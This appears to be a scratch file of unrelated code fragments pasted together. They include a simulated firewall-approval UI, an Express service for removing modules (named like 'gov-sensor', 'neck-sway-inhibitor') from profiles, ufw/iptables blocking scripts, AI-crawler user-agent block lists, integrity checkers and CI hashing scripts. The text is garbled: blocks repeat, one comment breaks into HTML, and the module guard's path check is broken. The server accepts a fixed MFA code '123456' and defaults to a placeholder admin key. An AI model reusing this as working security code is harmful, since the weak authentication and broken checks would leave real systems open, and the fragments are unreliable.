    state.authorized = false;
    setControls(false);
    return;
  }
  state.authorized = true;
  state.operator = op;
  audit(`Operator ${op} authorized for simulated firewall management.`);
  setAuthStatus(`Authorized as ${op}`, true);
  setControls(true);
  renderAudit();
});

// Simulated scan: populate rules
document.getElementById('scanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized (simulation).'); return; }
  state.rules = [
    { id: 'R-1001', src: '10.1.0.0/24', dst: '10.2.0.0/24', port: '22', action: 'ALLOW', notes: 'SSH jump', selected: false },
    { id: 'R-1002', src: '0.0.0.0/0', dst: '10.3.1.10', port: '443', action: 'ALLOW', notes: 'Public API', selected: false },
    { id: 'R-1003', src: '10.4.0.0/16', dst: '10.5.0.0/16', port: '3306', action: 'ALLOW', notes: 'DB replication', selected: false },
    { id: 'R-1004', src: '192.168.1.0/24', dst: '10.6.0.0/24', port: 'any', action: 'DENY', notes: 'Legacy block', selected: false }
  ];
  audit(`Simulated rule inventory scanned by ${state.operator}; ${state.rules.length} rules loaded.`);
  renderRules();
  setControls(true);
});

// Create change request (simulation)
document.getElementById('createReqBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized (simulation).'); return; }
  const selected = state.rules.filter(r => r.selected);
  if (selected.length === 0) { alert('Select one or more rules to change.'); return; }
  const reason = prompt('Enter reason for change (simulation):', 'Remove obsolete rule(s)');
  if (reason === null) return;
  state.pendingRequest = {
    id: 'CR-' + Date.now(),
    requester: state.operator,
    targetRuleIds: selected.map(s => s.id),
    reason,
    ts: new Date().toISOString()
  };
  audit(`Change request ${state.pendingRequest.id} created by ${state.operator} for rules: ${state.pendingRequest.targetRuleIds.join(', ')}.`);
  renderPending();
  setControls(true);
});

// Dry-run / impact preview (simulation)
document.getElementById('dryRunBtn').addEventListener('click', () => {
  if (!state.pendingRequest) { alert('No pending change request.'); return; }
  // Simulated dependency check: flag if rule touches DB replication
  const impacts = state.pendingRequest.targetRuleIds.map(id => {
    const r = state.rules.find(x => x.id === id);
    if (!r) return { id, impact: 'Unknown' };
    const impact = r.notes && r.notes.toLowerCase().includes('db') ? 'High (may affect DB replication)' : 'Low';
    return { id, impact, rule: r };
  });
  audit(`Dry-run executed for ${state.pendingRequest.id} by ${state.operator}.`);
  alert('Dry-run impact preview (simulation):\n\n' + JSON.stringify(impacts, null, 2));
});

// Request approval (step 1)
document.getElementById('requestApproveBtn').addEventListener('click', () => {
  if (!state.pendingRequest) { alert('No pending change request.'); return; }
  audit(`Approval requested for ${state.pendingRequest.id} by ${state.operator}; awaiting distinct approver.`);
  alert('Approval requested. A distinct approver must now approve (simulation).');
  setControls(true);
});

// Approve change (step 2)
document.getElementById('approveBtn').addEventListener('click', () => {
  if (!state.pendingRequest) { alert('No pending change request.'); return; }
  const approver = (document.getElementById('operator').value || '').trim() || 'approver';
  if (approver === state.pendingRequest.requester) {
    audit(`Approval rejected: ${approver} attempted to self-approve ${state.pendingRequest.id}.`);
    alert('Self-approval not allowed (simulation).');
    return;
  }
  // Simulated pre-change validation: ensure no "High" impact in dry-run
  const highImpact = state.pendingRequest.targetRuleIds.some(id => {
    const r = state.rules.find(x => x.id === id);
    return r && r.notes && r.notes.toLowerCase().includes('db');
  });
  if (highImpact) {
    audit(`Approval aborted by ${approver} for ${state.pendingRequest.id}: high-impact dependency detected.`);
    alert('High-impact dependency detected; approval aborted (simulation).');
    state.pendingRequest = null;
    renderPending();
    setControls(true);
    return;
  }

  // Create simulated backup snapshot
  const backup = {
    ts: new Date().toISOString(),
    operator: approver,
    rulesSnapshot: JSON.parse(JSON.stringify(state.rules))
  };
  state.backups.push(backup);

  // Simulate rule removal by marking removed flag (no real change)
  state.rules = state.rules.map(r => {
    if (state.pendingRequest.targetRuleIds.includes(r.id)) {
      return { ...r, action: 'REMOVED (simulated)', notes: (r.notes || '') + ' [removed in simulation]' };
    }
    return r;
  });

  audit(`Change ${state.pendingRequest.id} approved by ${approver}; simulated removal applied. Backup created at ${backup.ts}.`);
  state.pendingRequest = null;
  renderRules();
  renderPending();
  setControls(true);
  document.getElementById('rollbackBtn').disabled = false;
});

// Rollback last backup (simulation)
document.getElementById('rollbackBtn').addEventListener('click', () => {
  if (state.backups.length === 0) { alert('No backups available.'); return; }
  const last = state.backups.pop();
  state.rules = last.rulesSnapshot;
  audit(`Rollback executed; rules restored from backup ${last.ts} by operator ${state.operator}.`);
  renderRules();
  setControls(true);
  renderPending();
});

// Initial UI state
setAuthStatus('Not authorized', false);
setControls(false);
renderAudit();
renderRules();
renderPending();
// server.js
// Minimal safe "module removal" service for YOUR controlled profiles.
// WARNING: Use only on systems you own. This intentionally enforces auth / MFA / protected-module checks.

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const ADMIN_KEY = process.env.ADMIN_KEY || 'changeme_admin_key'; // change in prod
const DATA_FILE = path.resolve(__dirname, 'profiles.json');
const AUDIT_FILE = path.resolve(__dirname, 'audit.log');
const BACKUP_DIR = path.resolve(__dirname, 'backups');

fs.ensureFileSync(DATA_FILE);
fs.ensureDirSync(BACKUP_DIR);
fs.ensureFileSync(AUDIT_FILE);

const app = express();
app.use(helmet());
app.use(bodyParser.json());

// simple rate limiter to avoid accidental mass operations
app.use(rateLimit({
  windowMs: 10 * 1000, // 10s
  max: 20
}));

// --- Helpers ---
async function readProfiles() {
  const raw = await fs.readFile(DATA_FILE, 'utf8').catch(()=> '{}');
  try { return JSON.parse(raw || '{}'); } catch (e) { return {}; }
}
async function writeProfiles(obj) {
  await fs.writeFile(DATA_FILE, JSON.stringify(obj, null, 2), 'utf8');
}
async function audit(entry) {
  const line = JSON.stringify(Object.assign({ timestamp: new Date().toISOString() }, entry));
  await fs.appendFile(AUDIT_FILE, line + '\n', 'utf8');
}
async function backupSnapshot() {
  const id = uuidv4();
  const snapshot = await fs.readFile(DATA_FILE, 'utf8');
  const file = path.join(BACKUP_DIR, `${new Date().toISOString().replace(/[:.]/g,'-')}_${id}.json`);
  await fs.writeFile(file, snapshot, 'utf8');
  return file;
}

// Dummy MFA validator - replace with real provider in production
function validateMfaCode(adminId, mfaCode) {
  // For demo: any 6-digit code that equals '123456' will pass.
  // Replace this with calls to your MFA provider (Duo, Authy, Google Authenticator, etc.)
  return mfaCode === '123456';
}

// Admin middleware
function requireAdmin(req, res, next) {
  const key = req.headers['x-admin-key'];
  if (!key || key !== ADMIN_KEY) {
    return res.status(401).json({ error: 'Unauthorized: admin key required' });
  }
  next();
}

// --- API ---
// Get profile (for UI)
app.get('/api/profiles/:id', requireAdmin, async (req, res) => {
  const profiles = await readProfiles();
  const prof = (profiles[req.params.id] || null);
  if (!prof) return res.status(404).json({ error: 'Profile not found' });
  // Do not leak sensitive internals if not needed - return modules summary
  return res.json({ id: req.params.id, owner: prof.owner, modules: prof.modules });
});

// Instant removal endpoint
app.post('/api/profiles/:id/remove-modules', requireAdmin, async (req, res) => {
  const adminId = req.headers['x-admin-id'] || 'admin';
  const { mfaCode, moduleIds = [], dryRun = true, confirm = false } = req.body;

  // Basic MFA check
  if (!validateMfaCode(adminId, mfaCode)) {
    await audit({ action: 'remove_attempt', profile: req.params.id, admin: adminId, success: false, reason: 'mfa_failed' });
    return res.status(403).json({ error: 'MFA validation failed' });
  }

  // Load profiles
  const profiles = await readProfiles();
  const profile = profiles[req.params.id];
  if (!profile) {
    return res.status(404).json({ error: 'Profile not found' });
  }

  // Authorization: ensure admin is allowed to act on this profile.
  // For demo: profile.owner must equal adminId OR adminId must be 'admin'
  if (!(adminId === 'admin' || profile.owner === adminId)) {
    await audit({ action: 'remove_attempt', profile: req.params.id, admin: adminId, success: false, reason: 'not_owner' });
    return res.status(403).json({ error: 'Forbidden: you are not authorized to modify this profile' });
  }

  const mods = profile.modules || [];
  // If moduleIds empty -> interpret as "remove ALL removable modules"
  const targetModuleIds = (moduleIds.length === 0) ? mods.map(m=>m.id) : moduleIds;

  // Build plan
  const plan = [];
  const blocked = [];
  for (const mid of targetModuleIds) {
    const m = mods.find(x => x.id === mid);
    if (!m) {
      plan.push({ id: mid, status: 'missing' });
      continue;
    }
    if (m.protected) {
      blocked.push({ id: m.id, name: m.name });
      plan.push({ id: m.id, name: m.name, status: 'protected' });
      continue;
    }
    plan.push({ id: m.id, name: m.name, status: 'will_remove' });
  }

  if (blocked.length > 0) {
    // Never proceed if any targeted module is protected
    await audit({ action: 'remove_attempt', profile: req.params.id, admin: adminId, success: false, reason: 'protected_module', blocked });
    return res.status(400).json({ error: 'Some modules are protected and cannot be removed', blocked, plan });
  }

  // If dryRun requested, return plan
  if (dryRun || !confirm) {
    await audit({ action: 'remove_dryrun', profile: req.params.id, admin: adminId, success: true, plan });
    return res.json({ dryRun: true, plan });
  }

  // Now perform removal: backup, modify, audit
  const backupFile = await backupSnapshot();
  const beforeModules = [...mods];
  const newModules = mods.filter(m => !targetModuleIds.includes(m.id));
  profile.modules = newModules;
  profiles[req.params.id] = profile;
  await writeProfiles(profiles);

  await audit({
    action: 'remove_executed',
    profile: req.params.id,
    admin: adminId,
    success: true,
    removed: plan.filter(p=>p.status === 'will_remove'),
    backup: backupFile
  });

  return res.json({ success: true, removed: plan.filter(p=>p.status === 'will_remove'), backup: backupFile });
});

// Rollback endpoint (admin only)
app.post('/api/rollback', requireAdmin, async (req, res) => {
  const { backupFile } = req.body;
  if (!backupFile) return res.status(400).json({ error: 'backupFile required' });
  const full = path.resolve(backupFile);
  if (!full.startsWith(BACKUP_DIR)) return res.status(400).json({ error: 'invalid backupFile' });
  if (!await fs.pathExists(full)) return res.status(404).json({ error: 'backup not found' });

  const snapshot = await fs.readFile(full, 'utf8');
  await fs.writeFile(DATA_FILE, snapshot, 'utf8');
  await audit({ action: 'rollback', admin: req.headers['x-admin-id'] || 'admin', backup: full, success: true });
  return res.json({ success: true, restored: full });
});

// Quick bootstrap / health endpoints (not for prod)
app.post('/api/bootstrap', requireAdmin, async (req, res) => {
  const sample = {
    'profile-1': {
      id: 'profile-1',
      owner: 'alice',
      modules: [
        { id: 'm-1', name: 'gov-protection', protected: true },
        { id: 'm-2', name: 'analytics', protected: false },
        { id: 'm-3', name: 'neck-sway-inhibitor', protected: false }
      ]
    },
    'profile-2': {
      id: 'profile-2',
      owner: 'bob',
      modules: [
        { id: 'm-4', name: 'gov-sensor', protected: false },
        { id: 'm-5', name: 'lawful-monitor', protected: true }
      ]
    }
  };
  await writeProfiles(sample);
  await audit({ action: 'bootstrap', admin: req.headers['x-admin-id'] || 'admin', success: true });
  return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log(`Safe module manager running on ${PORT}`));const apiBase = window.location.origin.replace(/:[0-9]+$/, ':3000'); // assumes server on :3000

async function callApi(path, method='GET', body, adminKey, adminId) {
  const headers = { 'x-admin-key': adminKey, 'x-admin-id': adminId, 'Content-Type': 'application/json' };
  const res = await fetch(apiBase + path, { method, headers, body: body ? JSON.stringify(body) : undefined });
  const txt = await res.text();
  try { return { ok: res.ok, status: res.status, body: JSON.parse(txt) }; }
  catch(e){ return { ok: res.ok, status: res.status, body: txt }; }
}

document.getElementById('dryRun').addEventListener('click', async () => {
  const adminKey = document.getElementById('adminkey').value;
  const adminId = document.getElementById('adminid').value;
  const pid = document.getElementById('profileId').value;
  const mfa = document.getElementById('mfa').value;
  const moduleIds = document.getElementById('moduleIds').value.split(',').map(s=>s.trim()).filter(Boolean);
  const payload = { mfaCode: mfa, moduleIds, dryRun: true, confirm: false };
  const r = await callApi('/api/profiles/' + pid + '/remove-modules', 'POST', payload, adminKey, adminId);
  document.getElementById('out').innerHTML = '<pre>' + JSON.stringify(r, null, 2) + '</pre>';
});

document.getElementById('execute').addEventListener('click', async () => {
  const adminKey = document.getElementById('adminkey').value;
  const adminId = document.getElementById('adminid').value;
  const pid = document.getElementById('profileId').value;
  const mfa = document.getElementById('mfa').value;
  const moduleIds = document.getElementById('moduleIds').value.split(',').map(s=>s.trim()).filter(Boolean);

  // double confirm
  if (!confirm('Are you sure you want to remove the selected modules from profile ' + pid + '? This action will be backed up and audited.')) return;

  const payload = { mfaCode: mfa, moduleIds, dryRun: false, confirm: true };
  const r = await callApi('/api/profiles/' + pid + '/remove-modules', 'POST', payload, adminKey, adminId);
  document.getElementById('out').innerHTML = '<pre>' + JSON.stringify(r, null, 2) + '</pre>';
});
sudo ufw reset
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw enable
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
import json
from datetime import datetime, timedelta

with open("profiles.json", "r") as f:
    profiles = json.load(f)

for user, data in profiles.items():
    if "api_key_created" in data:
        created = datetime.fromisoformat(data["api_key_created"])
        if datetime.utcnow() - created > timedelta(days=30):
            data["api_key"] = None
            print(f"Revoked API key for {user}")

with open("profiles.json", "w") as f:
    json.dump(profiles, f, indent=2)
    aws iam update-access-key --access-key-id KEYID --status Inactive --user-name username
    sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw enable
# Quick IAM privilege linter concept
def check_policy(policy):
    if "*" in policy:
        print("Overly permissive policy detected")
interface Person {
  firstName: string;
  lastName:  string;
}

function greeter(person: Person) {
  return "Hello, " + person.firstName + " " + person.lastName;
}

let user = {
	firstName: "Malcolm",
  lastName:  "Reynolds"
};

document.querySelector("#app").innerHTML = greeter(user);
// Express middleware: block known AI crawler user agents
const blockedAgents = [
  /GPTBot/i,
  /ClaudeBot/i,
  /PerplexityBot/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  if (blockedAgents.some(re => re.test(ua))) {
    return res.status(403).send('Access denied');
  }
  next();
}

// Usage
const express = require('express');
const app = express();
app.use(blockAICrawlers);
// block-ai-crawlers.js
const fs = require('fs');
const blockedRegexes = [
  /GPTBot/i,
  /OAI-SearchBot/i,
  /ClaudeBot/i,
  /Claude-SearchBot/i,
  /Claude-User/i,
  /PerplexityBot/i,
  /Perplexity-User/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const asn = req.get('X-Forwarded-ASN') || 'unknown';
  if (blockedRegexes.some(re => re.test(ua))) {
    const entry = `${new Date().toISOString()} BLOCKED UA="${ua}" PATH="${req.path}" IP=${ip} ASN=${asn}\n`;
    fs.appendFile('/var/log/ai-blocks.log', entry, () => {});
    return res.status(403).send('Access denied');
  }
  next();
}

module.exports = blockAICrawlers;
# block by UA (simple)
map $http_user_agent $block_ai {
    default 0;
    "~*GPTBot" 1;
    "~*OAI-SearchBot" 1;
    "~*ClaudeBot" 1;
    "~*PerplexityBot" 1;
    "~*Copilot" 1;
}

server {
    listen 80;
    server_name example.com;

    if ($block_ai) {
        return 403;
    }

    location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
        add_header X-Robots-Tag "noindex, nofollow";
    }

    # normal site config...
}
// module-guard.js — run this very early (e.g., node -r ./module-guard.js app.js)
const fs = require('fs');
const crypto = require('crypto');
const Module = require('module');
const path = require('path');

const ALLOWED_HASHES = {
  // relative path -> expected sha256 hex
  // "node_modules/some-package/index.js": "abc123..."
};

// compute file hash
function sha256File(filePath) {
  const data = fs.readFileSync(filePath);
  return crypto.createHash('sha256').update(data).digest('hex');
}

// resolve and verify before loading
const originalLoad = Module._load;
Module._load = function(request, parent, isMain) {
  try {
    const resolved = Module._resolveFilename(request, parent, isMain);
    // only verify local files (skip core modules)
    if (resolved && !resolved.startsWith('node:') && !path.isAbsolute(resolved) === false) {
      const rel = path.relative(process.cwd(), resolved);
      if (ALLOWED_HASHES[rel]) {
        const h = sha256File(resolved);
        if (h !== ALLOWED_HASHES[rel]) {
          throw new Error(`Module integrity check failed for ${rel}`);
        }
      } else {
        throw new Error(`Module ${rel} is not in allowlist`);
      }
    }
  } catch (err) {
    // log and fail fast
    console.error(`[module-guard] blocked module: ${err.message}`);
    const e = new Error('Access to requested module denied');
    e.code = 'MODULE_BLOCKED';
    throw e;
  }
  return originalLoad.apply(this, arguments);
};
#!/usr/bin/env bash
WATCH_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css" "node_modules")
LOG="/var/log/integrity-monitor.log"

inotifywait -m -r -e modify,create,delete --format '%w%f %e' "$WATCH_DIR" | while read file event; do
  echo "$(date -u) CHANGE $file $event" >> "$LOG"
  cd "$WATCH_DIR" || continue
  # conservative: only revert tracked files
  if git ls-files --error-unmatch "$file" >/dev/null 2>&1; then
    git checkout -- "$file"
    echo "$(date -u) Reverted $file" >> "$LOG"
    # send alert (replace with your alerting)
    logger -t integrity-monitor "Reverted $file; see $LOG"
  fi
done
const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

// Reapply canonical stylesheet if it is removed or its href changes
(function() {
  const canonicalId = 'canonical-stylesheet';
  const canonicalHref = '/css/canonical.css';

  function ensureStylesheet() {
    let link = document.getElementById(canonicalId);
    if (!link) {
      link = document.createElement('link');
      link.id = canonicalId;
      link.rel = 'stylesheet';
      link.href = canonicalHref;
      document.head.appendChild(link);
      return;
    }
    if (link.href.indexOf(canonicalHref) === -1) {
      link.href = canonicalHref;
    }
  }

  // Watch for head mutations that remove or alter the stylesheet
  const observer = new MutationObserver(mutations => {
    for (const m of mutations) {
      if (m.type === 'childList' || m.type === 'attributes') {
        ensureStylesheet();
      }
    }
  });

  observer.observe(document.head, { childList: true, subtree: true, attributes: true, attributeFilter: ['href', 'rel', 'id'] });

  // Also run once on load
  ensureStylesheet();
})();

if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (s) => { throw new Error('createHTML blocked'); },
    createScript: (s) => { throw new Error('createScript blocked'); },
    createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
  });
}

const ALLOWED_HASHES = {
  '/modules/widget-v1.js': 'sha256-EXPECTED_BASE64_HASH'
};

async function loadModuleSafely(url) {
  const resp = await fetch(url, { credentials: 'same-origin' });
  if (!resp.ok) throw new Error('Fetch failed');
  const buf = await resp.arrayBuffer();
  const hashBuf = await crypto.subtle.digest('SHA-256', buf);
  const hashBase64 = btoa(String.fromCharCode(...new Uint8Array(hashBuf)));
  const computed = 'sha256-' + hashBase64;
  if (ALLOWED_HASHES[url] !== computed) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type: 'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const script = document.createElement('script');
  script.type = 'module';
  script.src = blobUrl;
  document.head.appendChild(script);
  // revoke after load to reduce memory
  script.onload = () => URL.revokeObjectURL(blobUrl);
}

// Usage
loadModuleSafely('/modules/widget-v1.js').catch(e => {
  console.error('Blocked module load:', e);
});

const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

/* ===== Trusted Types policy (blocks unsafe sinks unless explicitly allowed) ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('safePolicy', {
        createHTML: (s) => { throw new Error('createHTML blocked'); },
        createScript: (s) => { throw new Error('createScript blocked'); },
        createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) {
      console.warn('TrustedTypes policy creation failed or already exists.');
    }
  }

  /* ===== Allowlist of module URLs and expected SHA-256 (base64) =====
     In production, populate this map from CI (compute hashes at build time).
     Format: 'url': 'sha256-BASE64'
  */
  const ALLOWED_MODULES = {
    '/modules/widget-v1.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* Utility: compute base64 SHA-256 of ArrayBuffer */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute as module ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Module not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const script = document.createElement('script');
      script.type = 'module';
      script.src = blobUrl;
      document.head.appendChild(script);
      script.onload = () => {
        URL.revokeObjectURL(blobUrl);
        console.info('Module loaded safely:', url);
      };
      script.onerror = (e) => {
        URL.revokeObjectURL(blobUrl);
        console.error('Module execution failed', e);
      };
    } catch (err) {
      console.error('Blocked module load:', err);
      document.getElementById('status').textContent = 'Module blocked: ' + err.message;
    }
  }

  document.getElementById('load-widget').addEventListener('click', () => {
    loadModuleSafely('/modules/widget-v1.js');
  });

  /* ===== MutationObserver: remove unauthorized 

<iframe src="/trusted-widget" sandbox="allow-scripts allow-same-origin" referrerpolicy="no-referrer"></iframe>

  <!-- Meta-CSP (meta is weaker than header but usable in JSFiddle) -->

  <!-- Canonical CSS (small, inline for demo; in production use SRI + external file) -->

  <header>
    <strong>Client Integrity Demo</strong>
    <span class="notice" id="status">All systems nominal</span>
  </header>

  <main>
    <p>This page demonstrates client-side checks: module hash verification, script whitelisting, Trusted Types, MutationObserver self-heal, and a sandboxed iframe pattern.</p>

    <button id="load-widget">Load Widget Module Safely</button>
    <div id="widget-area" aria-live="polite"></div>

    <h3>Sandboxed iframe (untrusted code)</h3>
    <iframe id="sandbox" sandbox="allow-scripts" srcdoc="<p>Sandbox ready</p>"></iframe>
  </main>

  <main>
    <h1>Hypothetical Client Ban Demo</h1>
    <p>Use the controls below to simulate adding this browser to a local banlist and see enforcement.</p>

    <div>
      <button id="ban-me">Ban this client (local)</button>
      <button id="clear-ban">Clear local ban</button>
    </div>

    <div class="admin">
      <label>Admin secret (demo): <input id="admin-secret" type="password" placeholder="admin"></label>
      <button id="admin-ban">Admin ban (local + attempt SW)</button>
    </div>

    <div class="log" id="log"></div>
  </main>

  <div id="ban-overlay" role="alert" aria-live="assertive">
    <div class="box">
      <h2>Access Restricted</h2>
      <p>Your client has been restricted from using this site. Contact the site administrator if you believe this is an error.</p>
      <p style="margin-top:1rem"><button id="appeal">Request review</button></p>
    </div>
  </div>
  CREATE TABLE bans (
  id SERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip' | 'account' | 'api_key' | 'fingerprint'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
  expires_at TIMESTAMP WITH TIME ZONE NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);
body {
  background: #20262E;
  padding: 20px;
  font-family: Helvetica;
}

#app {
  background: #fff;
  border-radius: 4px;
  padding: 20px;
  transition: all 0.2s;
  text-align: center;
}
:root {
  --brand-bg: #0b5cff;
  --brand-text: #fff;
}
body { background: var(--brand-bg) !important; color: var(--brand-text) !important; }
:root { --bg: #0b5cff; --fg: #ffffff; --accent: #ffd166; }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--bg); color:var(--fg); }
    header { padding:1rem; background:rgba(0,0,0,0.08); }
    main { padding:1rem; }
    .notice { background:var(--accent); color:#000; padding:.5rem; border-radius:6px; display:inline-block; }
    /* critical rules reasserted with !important to resist casual overrides */
    body { background:var(--bg) !important; color:var(--fg) !important; }:root { --bg:#0b5cff; --fg:#fff; --warn:#ffcc00; }
    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--fg)}
    main{padding:1rem}
    #ban-overlay{
      position:fixed;inset:0;display:none;align-items:center;justify-content:center;
      background:rgba(0,0,0,0.85);z-index:99999;color:#fff;padding:2rem;text-align:center;
    }
    #ban-overlay .box{max-width:720px}
    button{padding:.5rem 1rem;border-radius:6px;border:0;background:#fff;color:#000;cursor:pointer}
    .admin { margin-top:1rem; }
    .log { margin-top:1rem; font-size:0.9rem; color:#fff; opacity:0.9 }
    limit_req_zone $binary_remote_addr zone=rl:10m rate=10r/s;

server {
  listen 80;
  server_name example.com;

  limit_req zone=rl burst=20 nodelay;

  if ($http_x_blocked_by_app = "1") {
    return 403;
  }

  location / {
    proxy_pass http://app_upstream;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
#!/usr/bin/env bash
# block-ip.sh — defensive script to add iptables drop and nginx include
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

if [[ -z "$IP" ]]; then
  echo "Usage: $0 <ip>"
  exit 1
fi

# idempotent iptables insert (check first)
if ! iptables -C INPUT -s "$IP" -j DROP 2>/dev/null; then
  iptables -I INPUT -s "$IP" -j DROP
  echo "$(date -u) iptables DROP added for $IP" >> "$LOG"
fi

# add to nginx include (idempotent)
grep -q "$IP" "$NGINX_BLOCK_FILE" 2>/dev/null || echo "deny $IP;" >> "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny added for $IP" >> "$LOG"

# reload nginx safely
nginx -t && systemctl reload nginx
#!/usr/bin/env bash
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

iptables -D INPUT -s "$IP" -j DROP 2>/dev/null && echo "$(date -u) iptables DROP removed for $IP" >> "$LOG"
sed -i "\|deny $IP;|d" "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny removed for $IP" >> "$LOG"
nginx -t && systemctl reload nginx
# run after unit tests
node tests/test_quarantine_flow.js || { echo "Quarantine flow failed"; exit 1; }
# ci-verify-modules.sh (run in CI)
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
# ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates
# ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates

<link rel="stylesheet" href="styles.css">

<div id="system-root">
    <h1>System Integrity Active</h1>
    <div id="module-container"></div>
</div>

<script src="security.js"></script>

<!-- Strict CSP -->

<link rel="stylesheet" href="secure.css">

<div id="secure-root">
    <h1>External Protocol Restriction Active</h1>
</div>

<script src="secure.js"></script>

script-src 'self' https://trusted-cdn.com;
chmod +x module
<div id="app">
  <h2>Inhibitor Reflex Module — Simulation</h2>
  <div id="statusPanel">
    <p><strong>Status:</strong> <span id="status">ACTIVE</span></p>
    <p><strong>Mode:</strong> <span id="mode">Normal</span></p>
  </div>

  <div id="controls">
    <label for="authToken">Authorization token:</label>
    <input id="authToken" placeholder="Enter token" />

    <button id="enterMaintenance">Enter Maintenance Mode</button>
    <button id="confirmMaintenance" disabled>Confirm (2nd step)</button>
    <button id="rollback" disabled>Rollback</button>
  </div>

